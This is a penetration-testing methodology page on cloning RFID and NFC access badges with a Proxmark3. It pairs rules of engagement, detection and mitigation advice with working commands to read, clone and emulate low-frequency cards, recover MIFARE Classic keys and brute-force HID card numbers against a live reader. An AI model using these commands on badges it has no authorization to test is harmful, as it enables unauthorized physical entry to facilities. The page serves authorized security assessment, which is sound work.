% Filename: 03-social-engineering/physical/badge-cloning.md
% Display name: Badge Cloning
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access)
% ATT&CK Techniques: T1199 (Trusted Relationship)
% Authors: @TristanInSec

# Badge Cloning

## Overview

Badge cloning duplicates RFID or NFC access cards to gain unauthorized
physical entry to facilities. Many organizations use low-frequency (125 kHz)
proximity cards that transmit card data without encryption, making them
trivially clonable with inexpensive hardware.

In authorized testing, badge cloning evaluates the strength of physical access
control technology and determines whether the organization should upgrade to
encrypted card systems.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1199 - Trusted Relationship

## Prerequisites

- Written authorization explicitly covering RFID/NFC badge cloning
- Proxmark3 hardware (or compatible reader/writer)
- Physical proximity to a target badge (reading range varies by technology)
- Blank writable cards (T55x7 for LF, MIFARE Classic for HF)

> **Rules of engagement for badge cloning:**
>
> - Badge cloning requires explicit authorization — possessing cloned access
>   cards without authorization may constitute a criminal offense
> - The authorization letter should specifically mention RFID/NFC testing
> - Cloned badges must be returned or destroyed after the assessment
> - Document which badge technologies were cloned and at what range
> - Never clone personal identification cards (government ID, transit cards)
>   — only access badges within the authorized scope
> - If testing involves reading badges from employees, the client must
>   authorize this contact method in the RoE

## Card Technology Overview

| Technology | Frequency | Encryption | Clonability |
|---|---|---|---|
| EM4100 / EM410x | 125 kHz (LF) | None | Trivial — read and clone |
| HID Prox | 125 kHz (LF) | None | Trivial — read and clone |
| HID iCLASS (legacy) | 13.56 MHz (HF) | 3DES (weak) | Possible with known attacks |
| MIFARE Classic | 13.56 MHz (HF) | Crypto1 (broken) | Possible with key recovery attacks |
| HID iCLASS SE | 13.56 MHz (HF) | AES | Difficult — requires key material |
| DESFire EV1/EV2 | 13.56 MHz (HF) | AES | Resistant to cloning |
| SEOS | 13.56 MHz (HF) | AES | Resistant to cloning |

Low-frequency cards (EM4100, HID Prox) are the primary targets for cloning
assessments. They broadcast their ID in cleartext with no authentication.

## Proxmark3

Proxmark3 is the standard tool for RFID security research. It reads, writes,
emulates, and analyzes both low-frequency (LF) and high-frequency (HF) cards.

```bash
# Proxmark3
# https://github.com/RfidResearchGroup/proxmark3

# Connect to Proxmark3 device
proxmark3 /dev/ttyACM0
```

Key flags:
- `-p` — serial port to connect to
- `-c` — execute a command and exit
- `-w` — wait for serial port to appear
- `-f` — flush output after every print

### Reading Low-Frequency Cards (125 kHz)

```bash
# Proxmark3
# https://github.com/RfidResearchGroup/proxmark3
# ---- Inside Proxmark3 interactive shell ----

# Auto-detect LF card type
lf search

# Read EM410x card
lf em 410x reader

# Continuously watch for EM410x cards
lf em 410x watch

# Read HID Prox card
lf hid reader

# Continuously watch for HID cards
lf hid watch
```

### Cloning Low-Frequency Cards

> **Authorization reminder:** Only clone badges that are explicitly within the
> authorized scope. Cloned cards must be tracked and destroyed after testing.

```bash
# Proxmark3
# https://github.com/RfidResearchGroup/proxmark3
# ---- Inside Proxmark3 interactive shell ----

# Clone EM410x card ID to a T55x7 writable card
# Replace <card_id> with the 10-hex-digit ID read from the target card
lf em 410x clone --id <card_id>

# Clone HID Prox card to a T55x7 writable card
# Replace <raw_data> with the hex data from 'lf hid reader'
lf hid clone -r <raw_data>

# Simulate EM410x card (emulate without writing to a physical card)
lf em 410x sim --id <card_id>

# Simulate HID Prox card
lf hid sim -r <raw_data>
```

### Reading High-Frequency Cards (13.56 MHz)

```bash
# Proxmark3
# https://github.com/RfidResearchGroup/proxmark3
# ---- Inside Proxmark3 interactive shell ----

# Auto-detect HF card type
hf search

# Read MIFARE Classic card info
hf mf info

# Attempt automatic key recovery and dump (MIFARE Classic)
hf mf autopwn

# Dump MIFARE Classic card contents
hf mf dump

# Read iCLASS card
hf iclass reader

# Dump iCLASS card
hf iclass dump
```

MIFARE Classic uses Crypto1 encryption, which has known cryptographic
weaknesses. The `hf mf autopwn` command attempts multiple attack vectors
(fchk, chk, darkside, nested, hardnested, staticnested) to recover sector keys and dump card contents.

### Bruteforce HID Card Numbers

If you know the facility code but not the card number, Proxmark3 can bruteforce
against a reader:

```bash
# Proxmark3
# https://github.com/RfidResearchGroup/proxmark3

# Bruteforce HID card numbers against a live reader
# This simulates sequential card IDs and monitors reader response
# -w specifies Wiegand format, --field specifies which field to brute, --fc is facility code
lf hid brute -w H10301 --field cn --fc <facility_code>
```

> **Note:** Bruteforcing against a live reader generates access log entries.
> Confirm this is acceptable in the rules of engagement.

## Assessment Methodology

1. **Identify card technology** — observe badge readers and cards (LF readers are typically larger with longer read range)
2. **Read a target badge** — requires brief physical proximity (2-10 cm for LF, 1-4 cm for HF)
3. **Clone to writable card** — write captured data to a blank T55x7 or compatible card
4. **Test cloned badge** — attempt to use the clone at a badge reader
5. **Document findings** — record which technology was in use, read range, and whether clone succeeded

## Detection Methods

- Access control logs showing badge used at unusual times or locations
- Dual-authentication systems (badge + PIN) that prevent clone-only access
- Visual inspection — cloned cards may look different from genuine badges
- Reader logs that detect multiple simultaneous reads from the same card ID
- Encrypted card systems that prevent replay of captured data

## Mitigation Strategies

- Upgrade from LF proximity cards (EM4100, HID Prox) to encrypted HF cards (DESFire EV2, SEOS)
- Implement multi-factor physical access — badge plus PIN at sensitive entry points
- Deploy shielded badge holders (RFID-blocking sleeves) to prevent unauthorized reading
- Monitor access control logs for anomalous patterns (same badge at two locations, after-hours access)
- Periodically test card system security with authorized RFID assessments

## References

### Tools

- [Proxmark3 RRG/Iceman Fork](https://github.com/RfidResearchGroup/proxmark3)

### MITRE ATT&CK

- [T1199 — Trusted Relationship](https://attack.mitre.org/techniques/T1199/)
